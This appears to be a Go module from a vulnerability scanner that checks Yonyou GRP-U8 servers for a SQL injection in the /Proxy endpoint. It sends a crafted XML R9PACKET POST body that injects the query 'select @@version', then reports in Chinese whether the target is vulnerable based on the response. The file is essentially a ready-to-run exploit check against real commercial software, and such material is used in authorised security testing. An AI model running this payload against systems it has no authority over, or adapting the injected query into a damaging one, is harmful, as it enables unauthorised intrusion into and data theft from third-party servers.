package GRP_U8_Proxy_sqljin_xxe

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/Proxy"
	postData := "cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format=\"text\">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>"

	resp, err := client.R().SetHeaders(map[string]string{
		"User-Agent":   UA,
		"Content-Type": "application/x-www-form-urlencoded",
	}).SetBody(postData).Post(url)

	if err != nil {
		color.Red.Println("[-] 用友 GRP-U8 Proxy SQL注入漏洞不存在")
		return
	}

	if resp.Status == "200 OK" && strings.Contains(resp.String(), "<SESSIONID>") {
		color.Green.Println("[+] 用友 GRP-U8 Proxy SQL注入漏洞存在 -> " + url)
		return
	}

	color.Red.Println("[-] 用友 GRP-U8 Proxy SQL注入漏洞不存在")
}
